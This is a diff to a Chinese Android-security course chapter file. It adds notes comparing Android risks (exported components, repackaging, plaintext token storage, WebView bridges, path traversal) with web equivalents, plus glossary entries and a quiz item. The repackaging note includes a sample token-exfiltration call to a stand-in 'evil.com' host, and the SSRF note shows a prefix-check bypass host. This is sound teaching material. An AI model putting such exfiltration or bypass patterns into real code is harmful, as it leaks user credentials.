@@ -592,7 +592,22 @@ window.CHAPTER = {
           '<li><span class="mono">android:permission="…"</span> —— 门上装了刷卡器。<strong>但刷卡器的等级（protectionLevel）才决定它管不管用</strong>：' +
           '<span class="mono">normal</span> 是"自己印一张卡就能刷"，<span class="mono">signature</span> 才是"只有配发的钥匙能开"。</li>' +
           '</ul>' +
-          '<p>本章讲的七类风险，每一类的入口都落在这栋楼的某个房间上。所以先把这个开关的语义彻底搞清，后面七节都是在它的基础上分岔。</p>'
+          '<p>本章讲的七类风险，每一类的入口都落在这栋楼的某个房间上。所以先把这个开关的语义彻底搞清，后面七节都是在它的基础上分岔。</p>' +
+          T.note('cool', '🌐 Web/JS 逆向视角',
+            '<p><span class="pill">JS 视角</span> 这一节讲的"<b>组件导出 = 攻击面</b>"，是安卓版的"<b>鉴权缺失的公开 endpoint</b>"——本质都是"哪些接口不需要任何凭据就能被外部调用"。' +
+            'JS 逆向里你天天和这个打交道：未鉴权的内部 API、Swagger 没关、调试路由在 prod 残留、Actuator 端点暴露。' +
+            '把这些概念映射过来，整章的"组件安全"在你眼里就是"端点安全"的另一副面孔。</p>' +
+            '<p><b>对位</b>:<br>' +
+            '· <span class="mono">android:exported="true"</span> ≈ 公开的、未鉴权的 REST API 端点（任何人能 GET/POST）<br>' +
+            '· <span class="mono">android:exported="false"</span> ≈ 仅同源 / 仅内网可达的接口<br>' +
+            '· <span class="mono">protectionLevel="normal"</span> ≈ CORS <span class="mono">Access-Control-Allow-Origin: *</span> 看着限制了其实任何域都能调<br>' +
+            '· <span class="mono">protectionLevel="signature"</span> ≈ 后端校验 JWT 签名（必须本系统私钥签发，第三方签不出来）<br>' +
+            '· 导出的 Activity 接受 Intent extras ≈ 不鉴权的 endpoint 接受 query/body 参数<br>' +
+            '· 缺失的权限声明（清单里没有 <permission> 块）≈ 接口路径在网关层根本不存在白名单规则</p>' +
+            '<p><b>关键差异</b>:Web 端的 endpoint 通常有网关/WAF 做集中鉴权，而安卓的"鉴权"散落在每个组件自己的 <span class="mono">permission</span> 属性上——' +
+            '意味着<b>每一道门都得自己装</b>，漏一个就是一个口子。这和"接口鉴权"在网关里统一配置的 Web 思路正好相反。</p>' +
+            '<p><b>逆向视角</b>:当你发现一个站点有一堆未鉴权的 endpoint，第一反应是"<b>这些接口的入参我能控制到什么程度</b>"。' +
+            '安卓组件也一样——清单告诉你"哪些门开着"，但<b>门后面做的事才是真正的风险面</b>，所以你下一步必须读组件内部代码，而不是只看清单就下结论。</p>')
       },
       html:
         '<p>"导出"（exported）这个词在 Android 里只有一个意思：<b>这个组件能不能被"别的 App"（更准确地说，是不同 UID 的进程）调用</b>。' +
@@ -894,7 +909,25 @@ window.CHAPTER = {
           '<p>这就是重打包对开发者的真实含义：它不是"代码被别人读懂了"，而是' +
           '<strong>"你的产品被复制成了一份你控制不了的产物，而且用户分不清"</strong>。</p>' +
           '<p>和本章其他风险不同的是：重打包<strong>不需要攻击者碰你的服务器，也不需要碰用户设备上的其他 App</strong>——' +
-          '他只需要拿到那个 APK 文件。所以它是唯一一类"你什么都没做错，只要发过包就可能中招"的风险。</p>'
+          '他只需要拿到那个 APK 文件。所以它是唯一一类"你什么都没做错，只要发过包就可能中招"的风险。</p>' +
+          T.note('cool', '🌐 Web/JS 逆向视角',
+            '<p><span class="pill">JS 视角</span> 重打包 ≈ <b>前端供应链投毒</b>（supply chain attack）——' +
+            '别人拿走你的产物（APK / npm 包 / CDN 文件），塞点自己的东西，再以你的名义分发出去，' +
+            '最终用户分不清真货假货。' +
+            '不管是 npm 包的 postinstall 钩子、CDN 上的 jQuery 被替换、还是浏览器扩展被 fork 后注入广告，根因和危害形态都一样。</p>' +
+            '<p><b>对位</b>:<br>' +
+            '· APK 重打包（反编译 → 改 smali → 重签名）≈ fork 一个开源 npm 包 → 改 build 产物 → 发到自己的 CDN<br>' +
+            '· 用户装上假包看到原品牌界面 ≈ 浏览器加载了被污染的 jQuery，调用方以为还是官方版本<br>' +
+            '· 签名校验（防止改包重签名）≈ SRI（Subresource Integrity，<span class="mono">integrity="sha384-…"</span>）' +
+            '—— 加载 CDN 资源前校验哈希，不对就直接拒加载<br>' +
+            '· APK 完整性校验（dex/so 摘要比对）≈ package-lock.json + npm audit + 锁定依赖哈希<br>' +
+            '· "把关键判定放服务端" ≈ 客户端永远不可信，关键判断必须在服务端做（这条两边完全一致）<br>' +
+            '· 第三方 SDK 自带的导出组件 / 明文流量 ≈ 你引入的开源依赖里有一行 <span class="mono">fetch("evil.com?d=" + token)</span>，你可能根本不知道</p>' +
+            '<p><b>关键差异</b>:npm 投毒后通常很快被 npm audit / Snyk 拉到，而 APK 假包一旦发布到第三方渠道就<b>几乎没有自动召回机制</b>——' +
+            '安卓侧少了 npm 那种"安装即知"的版本锁和依赖图。所以"取证 → 平台投诉 → 下架"成了安卓侧的主要止血手段。</p>' +
+            '<p><b>逆向视角</b>:JS 侧遇到可疑的第三方包，先 <span class="mono">npm view <pkg></span> 看作者、看版本、看依赖图；' +
+            '安卓侧遇到 APK 改包，做的是同一件事——<b>比对签名 / dex 指纹 / 资源 hash</b>，把"哪些字节被改过"定位到函数级别。' +
+            '你之前做过 npm 包的 AST diff，这套手法在 smali 层完全对得上。</p>')
       },
       html:
         '<p>先把边界划清楚，因为这一节很容易写偏：<b>改包的具体手法（反编译、改 smali、重签名）在第 2 章讲，' +
@@ -1036,7 +1069,27 @@ window.CHAPTER = {
           '然后 token 明文写在 shared_prefs 的一个 XML 文件里</strong>——' +
           '而那个文件，在 root 设备上、在备份里、在恶意 App 能碰到的地方，都是可读的。</p>' +
           '<p>更麻烦的是它的形态：明文保存造成的泄漏<strong>不是"一次事件"，而是"一个持续存在的可读面"</strong>——' +
-          '只要数据还在那里，任何一个能读到它的路径都是一次泄漏。</p>'
+          '只要数据还在那里，任何一个能读到它的路径都是一次泄漏。</p>' +
+          T.note('cool', '🌐 Web/JS 逆向视角',
+            '<p><span class="pill">JS 视角</span> 这节讲的"明文存敏感数据"，对 JS 逆向工程师来说<b>最熟悉的对应物就是 localStorage / sessionStorage / IndexedDB 里明文存 token</b>——' +
+            '你每次开 DevTools 都能在 Application 面板看到一堆站点的 <span class="mono">access_token</span>、<span class="mono">userInfo</span> 明文躺在那。' +
+            '本质上两边是同一个问题：<b>客户端是敌对环境，存进去的东西等于公开</b>。</p>' +
+            '<p><b>对位</b>:<br>' +
+            '· SharedPreferences 明文存 token ≈ <span class="mono">localStorage.setItem("token", jwt)</span>，DevTools 一看就拿到<br>' +
+            '· SQLite 明文存用户数据 ≈ IndexedDB 存用户表 / 历史记录，开发工具能直接 dump<br>' +
+            '· 日志里打印 token / Authorization ≈ <span class="mono">console.log("resp=", json)</span> 出敏感字段<br>' +
+            '· <span class="mono">allowBackup="true"</span> ≈ 浏览器开发者工具能直接看 localStorage 明文（任人都能开 DevTools）<br>' +
+            '· 硬编码在 APK 里的 AES key / sign_salt ≈ 前端 JS 里写死 <span class="mono">const SECRET = "abc123"</span> 拿来加签<br>' +
+            '· 备份导出（adb backup）≈ 把浏览器 profile 文件夹整个拷贝走（历史/书签/cookie 全部带走）<br>' +
+            '· Keystore + EncryptedSharedPreferences ≈ HttpOnly Cookie + 服务端 Session（密钥不在前端）<br>' +
+            '· "客户端不存在绝对安全的本地存储" ≈ "前端代码对用户透明，没有秘密可言"——两边都是同一句话</p>' +
+            '<p><b>关键差异</b>:Web 侧最大的威胁面其实是<b>第三方 JS 库能随便读 localStorage</b>（XSS 一次性把所有存的东西卷走），' +
+            '而安卓侧 SharedPreferences 是受沙箱保护的（默认情况下其他 App 读不到）。' +
+            '所以安卓的"明文存"风险主要发生在 <b>root / 备份 / 调试</b> 这三条路径上，' +
+            '威胁面比 Web 窄，但单次泄漏的影响面通常比 XSS 大（持久在盘上、有备份可长期扩散）。</p>' +
+            '<p><b>逆向视角</b>:JS 逆向看到站点把 token 写 localStorage，第一反应是"DevTools 改一改就能伪装用户"。' +
+            '安卓侧看到 SharedPreferences 明文存 token，第一反应应该是<b>"这个 APK 落在 root 设备 / 备份文件里之后，攻击者能冒充哪些用户"</b>——' +
+            '评估标准完全一样：泄漏之后能做什么。判断完这一点，要不要修、修多紧，结论就出来了。</p>')
       },
       html:
         '<p>这一节的目标很具体：<b>把"明文保存"从一个模糊的印象，变成一张可以逐项勾选的清单</b>。' +
@@ -1414,7 +1467,16 @@ window.CHAPTER = {
                '中高（要改前后端约定）', '减少暴露面。具体 API 与可用性随版本变化，<span class="pill warn">待核实</span>'],
               ['<b>不让外部 URL 进入同一个 WebView 实例</b>：敏感页面用独立实例，且不注入桥',
                '中', '把"外部页面"和"有桥的页面"物理隔开——这是最彻底的一条']
-            ])),
+            ])) +
+        T.note('cool', '🌐 JS 视角批注',
+          '<p><span class="pill">JS 类比</span> WebView 这节讲的是"<b>JS 执行环境被外部代码污染</b>"——' +
+          '<b>addJavascriptInterface ≈ iframe + postMessage + 不安全 eval</b>，桥本身就是漏洞。' +
+          '从 JS 逆向角度看，这其实就是"前端 XSS → RCE"的移动端翻版：' +
+          '恶意 JS 一旦进了带桥的 WebView，就拿到了调 native API 的能力——和浏览器里 XSS 拿到 cookie / fetch token / eval 任意代码的危害形态完全一致。</p>' +
+          '<p><span class="pill">JS 类比</span> <b>file 域三个开关 ≈ 浏览器的同源策略放宽</b>：' +
+          '<span class="mono">setAllowFileAccessFromFileURLs</span> ≈ <span class="mono">document.domain</span> 被改后跨子域可读；' +
+          '<span class="mono">setAllowUniversalAccessFromFileURLs</span> ≈ CORS <span class="mono">*</span>，file:// 页面能直接请求任意源。' +
+          '在 JS 逆向里你见的"老浏览器降级 + CORS 配错"导致的数据外传，和这里 file:// 跳板出去的链路<b>结构上一模一样</b>。</p>'),
       stage: {
         title: 'WebView 的三个开关 · 谁在管哪一段',
         speed: 1500,
@@ -1606,7 +1668,18 @@ window.CHAPTER = {
         ]) +
         '<p>修复只有一句话，但要做到才算数：<b>把检查对象从"字符串"换成"归一化之后的真实路径"，' +
         '并且彻底取消"由外部输入决定路径"这件事</b>——把 Uri 当成 ID，用查表映射到固定文件；' +
-        '或者直接改用 <span class="mono">FileProvider</span> 并只暴露 <span class="mono">cache-path</span> 这类必要目录。</p>',
+        '或者直接改用 <span class="mono">FileProvider</span> 并只暴露 <span class="mono">cache-path</span> 这类必要目录。</p>' +
+        T.note('cool', '🌐 JS 视角批注',
+          '<p><span class="pill">JS 类比</span> <b>Provider 目录遍历 ≈ Web 端的 SSRF / 任意文件读取</b>。' +
+          '路径拼接不消除 <span class="mono">..</span>、<span class="mono">startsWith</span> 没分隔符边界——' +
+          '这两条坑放到 JS 里就是"用 <span class="mono">fetch(userInputUrl)</span> 读文件"和"用 <span class="mono">startsWith(allowedHost)</span> 校验域名"。' +
+          'Node.js 里 <span class="mono">path.join(root, userInput)</span> 一样不消除 <span class="mono">..</span>（必须用 <span class="mono">path.resolve</span> 后再校验），' +
+          '<b>规则两边完全一致</b>：检查前必须归一化，且必须带分隔符边界。</p>' +
+          '<p><span class="pill">JS 类比</span> <b>不归一化 + 前缀比较 = Web 端最经典的 SSRF 假阴性</b>：' +
+          '类似 <span class="mono">if (url.startsWith("https://api.example.com"))</span>，' +
+          '但攻击者用 <span class="mono">https://api.example.com.attacker.com</span> 绕过——前缀相同，host 不同。' +
+          'Web 端的解法是 parse URL 后比较 <span class="mono">new URL(input).host === "api.example.com"</span>，' +
+          '对应到安卓就是 <span class="mono">getCanonicalPath()</span> 后再比较。</p>'),
       stage: {
         title: 'openFile 的路径解析 · 检查与打开为何不是同一个对象',
         speed: 1500,
@@ -2545,7 +2618,10 @@ window.CHAPTER = {
     { t: 'LocalBroadcastManager', d: '进程内广播机制，广播不经过系统，其他 App 无法发送或接收（现已被官方标记为可选替代方案，新代码可用其它进程内通信）。' },
     { t: 'Drozer', d: '在真实设备上以"攻击者 App"的身份调用目标组件的动态审计框架，能发现静态扫描发现不了的运行时问题。' },
     { t: 'MobSF', d: 'Mobile Security Framework：APK/IPA 静态分析 + 动态分析平台，输出 Manifest 风险项、硬编码密钥、API 清单、权限与第三方 SDK 等。' },
-    { t: 'MASVS / MASTG', d: 'OWASP 的移动应用安全验证标准与测试指南：前者是"应该满足什么控制项"，后者是"怎么验证"。' }
+    { t: 'MASVS / MASTG', d: 'OWASP 的移动应用安全验证标准与测试指南：前者是"应该满足什么控制项"，后者是"怎么验证"。' },
+    { t: '↔ Web 对位 · 组件导出 = 未鉴权 API 端点', d: 'android:exported="true" 在 Web 端的对应物是"未鉴权的公开 REST 端点"。两边都在问同一件事:"谁能调、谁不能调"。关键差异是 Web 有网关/WAF 集中鉴权,而安卓的鉴权散落在每个组件自己的 permission 属性上,漏一个就是一个口子。审计时把"已导出的组件清单"翻译成"未鉴权端点清单",再分别测每个的入参能控制到什么程度。' },
+    { t: '↔ Web 对位 · 明文存数据 = localStorage 存 token', d: 'SharedPreferences 明文存 token ≈ localStorage.setItem("token", jwt)。DevTools 一看就拿到,泄露窗口完全相同。安卓侧额外的威胁路径是 adb backup 和 root 读取——相当于把整个浏览器 profile 文件夹打包带走。所以评估标准就是一句话:"这个东西泄露之后,攻击者能冒充谁、能做什么"。' },
+    { t: '↔ Web 对位 · addJavascriptInterface = iframe + 不安全 eval', d: 'JS 桥让外部页面调 native API,在 Web 端对应的是 XSS 后 eval 任意 JS——都能拿到执行宿主能力的权限。file:// 域三个开关 ≈ CORS 配错/document.domain 放宽导致跨域可读。修复思路两边一样:先把"页面来源"控制住(白名单/Trusted Types),再谈"方法暴露面"(CSP / 桥方法最小化)。' }
   ],
 
   teacher: {
@@ -2556,6 +2632,32 @@ window.CHAPTER = {
            '我考的是：<b>给你一个现象，你能不能算出它的风险等级、说清它在什么条件下真的可被利用、以及你凭什么这么判。</b><br>' +
            '记住一件事：<span class="hit">把所有项都标高危，等于没有排序，也就等于没有评审。</span></p>',
     questions: [
+      {
+        id: 'c04qWeb', depth: 2, threshold: 0.7,
+        q: '安卓 App 的「组件暴露、权限模型、WebView、Intent」这些风险面，在你熟悉的 Web 端都能找到对位。说出至少三组对位，并各说一条关键差异。',
+        concepts: [
+          { label: 'exported 组件 ≈ 未鉴权的 API 端点', hint: '被外部直接调用的入口。', any: ['接口', 'API', '未鉴权', '暴露', '端点', '路由'] },
+          { label: 'WebView 注入 ≈ XSS', hint: '把不可信内容当代码执行。', any: ['XSS', '注入', '跨站', '脚本', 'eval'] },
+          { label: 'Intent 劫持 ≈ CSRF/开放重定向', hint: '伪造一个请求让目标替你做坏事。', any: ['CSRF', '重定向', '劫持', '伪造', 'Intent'] },
+          { label: '权限模型 ≈ 同源策略', hint: '默认隔离，显式授权才打通。', any: ['同源', '权限', 'CORS', '策略', '隔离'] }
+        ],
+        hints: [
+          '先想「谁能调用我」：安卓的 exported 组件和前端的未鉴权接口，都是「默认以为没人知道，实际上谁都能打」。',
+          '再想「不可信输入当代码执行」：WebView 的 addJavascriptInterface + JS 注入，就是移动端的 XSS。'
+        ],
+        probes: [
+          '追问：同样是「外部能触发我的逻辑」，为什么安卓叫组件暴露而前端叫未授权访问？威胁模型差在哪？',
+          '再追问：安卓有权限弹窗让用户授权，前端的用户授权机制是什么？为什么两者都不完全可靠？'
+        ],
+        model: '<b>参考答案</b>：<br>① <b>exported 组件 ≈ 未鉴权的 API 端点</b>：都是「对外暴露的可执行入口」，' +
+          '被扫到/被猜到就能直接调用。差异：安卓组件通过 Binder 被<b>其他 App</b> 调用（同设备跨进程），前端接口被任意网络客户端调用——前者的攻击者通常已经在设备上。<br>' +
+          '② <b>WebView 注入 ≈ XSS</b>：WebView 里 loadUrl 的页面若拼接了不可信参数，或 addJavascriptInterface 暴露了 Java 对象，攻击者就能在 App 的 WebView 上下文里执行 JS；' +
+          '和前端的 XSS 一样都是「不可信输入变成代码执行」。差异：WebView 的 JS 能通过桥直接调 Java 方法（影响 native/系统），破坏半径比网页 XSS 更大。<br>' +
+          '③ <b>Intent 劫持 ≈ CSRF/开放重定向</b>：攻击者构造一个 Intent 让你的组件替他完成操作（比如替它发一个带权限的请求）；' +
+          '和前端的 CSRF 一样是「借你的身份做坏事」。差异：Intent 可以是显式的（指名道姓打你），CSRF 只能借浏览器自动带 cookie 的特性。<br>' +
+          '④ <b>权限模型 ≈ 同源策略</b>：安卓 App 默认互相隔离（不同 UID），要跨 App 取数据必须显式用 ContentProvider/权限；前端默认同源隔离，跨域要 CORS 显式放行。' +
+          '差异：安卓权限是<b>安装时/运行时由用户授权</b>，用户往往不看就点允许——前端的同源策略用户完全不参与，反而更可预测。'
+      },
       {
         id: 'c29q1', depth: 1, threshold: 0.7,
         q: '一个组件的 <span class="mono">android:exported</span> 到底在管什么？请说清：没写这个属性时系统怎么判断，以及 Android 12 改变了什么。',
